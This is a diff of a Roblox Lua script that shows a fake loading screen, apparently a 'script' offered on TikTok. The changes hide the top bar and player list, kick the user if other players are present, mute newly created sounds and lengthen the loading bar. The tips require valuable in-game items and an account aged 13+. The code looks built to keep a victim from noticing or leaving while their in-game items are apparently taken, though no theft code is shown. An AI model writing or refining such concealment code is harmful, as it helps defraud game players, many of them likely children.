@@ -3,30 +3,32 @@ local StarterGui = game:GetService("StarterGui")
 local RunService = game:GetService("RunService")
 local SoundService = game:GetService("SoundService")
 local Workspace = game:GetService("Workspace")
+local CoreGui = game:GetService("CoreGui")
 
 local player = Players.LocalPlayer
 
--- Hide top bar for visual cleanliness (optional)
+-- ===== HIDE LOCAL PLAYER TOP BAR =====
 pcall(function()
-    StarterGui:SetCore("TopbarEnabled", true)
+    StarterGui:SetCore("TopbarEnabled", false)
 end)
 
--- Hide "Leave Experience" button
-local function hideLeaveButton(hide)
+-- ===== DISABLE PEOPLE MENU (STRONG) =====
+pcall(function()
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+end)
+
+RunService.RenderStepped:Connect(function()
     pcall(function()
-        local CoreGui = game:GetService("CoreGui")
-        local PlayerList = CoreGui:FindFirstChild("PlayerList")
-        if PlayerList then
-            local leaveBtn = PlayerList:FindFirstChild("LeaveButton")
-            if leaveBtn then
-                leaveBtn.Visible = not hide
-            end
-        end
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
     end)
+end)
+
+-- ===== KICK IF MULTIPLE PLAYERS =====
+if #Players:GetPlayers() > 1 then
+    player:Kick("Only the person who used the script can be in game while it’s active! Try again with just one person.")
 end
 
 -- ===== AUDIO CONTROL =====
--- Step 1: Record existing sounds (keep these unmuted)
 local existingSounds = {}
 for _, sound in pairs(Workspace:GetDescendants()) do
     if sound:IsA("Sound") then
@@ -39,24 +41,20 @@ for _, sound in pairs(SoundService:GetDescendants()) do
     end
 end
 
--- Step 2: Function to mute new sounds
 local function muteNewSound(sound)
     if sound:IsA("Sound") and not existingSounds[sound] then
         sound.Volume = 0
     end
 end
 
--- Step 3: Connect to new descendants added
 Workspace.DescendantAdded:Connect(muteNewSound)
 SoundService.DescendantAdded:Connect(muteNewSound)
--- ========================
 
--- Global state
+-- ===== LOADING UI =====
 local progress = 0
 local isWaiting = false
 local playerGui = player:WaitForChild("PlayerGui")
 
--- Create or get existing UI
 local function getLoadingUI()
     local gui = playerGui:FindFirstChild("IntroLoadingGui")
     if gui then
@@ -133,12 +131,10 @@ end
 
 local ui = getLoadingUI()
 
--- Smooth interpolation
 local function lerp(a, b, t)
     return a + (b - a) * t
 end
 
--- Pulsing glow animation
 spawn(function()
     local increasing = true
     while ui.Gui.Parent do
@@ -157,28 +153,27 @@ spawn(function()
     end
 end)
 
--- Run loading
+-- ===== LOADING BAR TIMING =====
 local function runLoading()
-    hideLeaveButton(true)
     spawn(function()
         while true do
             if not isWaiting then
-                for i = progress + 1, 100 do
+                for i = 1, 100 do
                     progress = i
                     local currentWidth = ui.Bar.Size.X.Scale
                     for t = 0, 1, 0.05 do
                         ui.Bar.Size = UDim2.new(lerp(currentWidth, progress / 100, t), 0, 1, 0)
-                        task.wait(0.01)
+                        task.wait(1.6 / 20)
                     end
 
                     if progress < 20 then
-                        ui.Feedback.Text = "Initializing.. Initializing. Dm AtomicVomit.lol on tiktok for any questions."
+                        ui.Feedback.Text = "Initializing... Dm AtomicVomit.lol on tiktok for any questions."
                     elseif progress < 50 then
-                        ui.Feedback.Text = "Tip : if multiple people are in game, the script won’t load!"
+                        ui.Feedback.Text = "Tip: if multiple people are in game, the script won’t load!"
                     elseif progress < 80 then
                         ui.Feedback.Text = "Tip: if you have bad brainrots in your base, the client won’t respond. 50M+ needed."
                     else
-                        ui.Feedback.Text = "Finalizing..."
+                        ui.Feedback.Text = "Tip: your account must be 13+ for the script to work."
                     end
                 end
 
@@ -188,13 +183,10 @@ local function runLoading()
                 task.wait(2)
                 isWaiting = false
 
-                -- Reset
                 progress = 0
                 ui.Bar.Size = UDim2.new(0, 0, 1, 0)
                 ui.Title.Text = "LOADING SCRIPT..."
                 ui.Feedback.Text = "Initializing..."
-
-                hideLeaveButton(false)
             else
                 task.wait(1)
             end
